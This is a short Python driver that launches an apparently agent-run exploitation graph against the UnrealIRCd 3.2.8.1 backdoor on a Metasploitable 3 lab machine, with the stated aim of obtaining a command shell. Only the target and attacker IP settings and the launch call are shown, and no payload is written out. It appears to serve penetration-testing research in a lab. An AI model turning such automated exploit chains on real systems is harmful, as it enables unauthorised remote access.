"""
Live test driver for examples/unrealircd_backdoor_graph.py.

Unauthenticated IRC exploitation chain against Metasploitable 3's
UnrealIRCd 3.2.8.1 backdoor on port 6667. Expected to land a
command shell via the trojaned backdoor command.
"""

from __future__ import annotations
import os

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core_agents.orchestrator import run_graph
from examples.unrealircd_backdoor_graph import build_unrealircd_backdoor_graph

TARGET_IP = "192.168.34.7"
ATTACKER_IP = os.getenv("LHOST", "192.168.34.1")

if __name__ == "__main__":
    graph = build_unrealircd_backdoor_graph(target_ip=TARGET_IP, attacker_ip=ATTACKER_IP)
    print(f"Loaded graph: {graph.name}  ({len(graph.nodes)} nodes, {len(graph.edges)} edges)")
    print(f"Running with explore=True, use_judge=True against {TARGET_IP}...")
    run_graph(graph, explore=True, use_judge=True)
